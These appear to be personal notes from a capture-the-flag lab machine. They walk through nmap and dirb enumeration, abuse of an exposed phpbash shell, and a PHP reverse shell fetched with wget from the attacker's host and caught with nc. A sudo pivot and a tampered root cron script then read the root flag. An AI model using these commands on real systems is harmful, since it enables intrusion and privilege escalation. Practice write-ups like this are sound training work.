nmap -sC -sV -oN nmap 10.10.10.68 -v -A
-> only port 80

http://10.10.10.68/single.html -> shows about phpbash

dirb
-> /php = nothing interesting
-> /dev = phpbash

cd /home -> arrexel and we get user flag

echo allo > test
cat test -> success

echo "<?php echo allo; ?>" > test.php ===> echo "" > test.php
cat test.php -> fails
= filter on input

i saw /uploads in dirb, maybe i can download a reverse shell

nc -lvnp 4444 on host and ip a to get ip

cp /usr/share/laudanum/php/php-reverse-shell.php .
change ip:port

python -m SimpleHTTPServer 80

then dl reverse shell on target
wget 10.10.14.34/php-reverse-shell.php (10.10.14.34 = host ip)

then go to /uploads/php-reverse-shell.php -> nc opens a shell

sudo -l -> sudo -u scriptmanager bash then spawn /bin/sh again
ls -all in / -> scripts belongs to scriptmanager

we see test.py is executed by root every minute
because it writes in "test.txt" which belongs to root
modify test.py to print /root/root.txt

echo 'f = open("/root/root.txt", "r").read(); g = open("test.txt", "w"); g.write(f)' > test.py
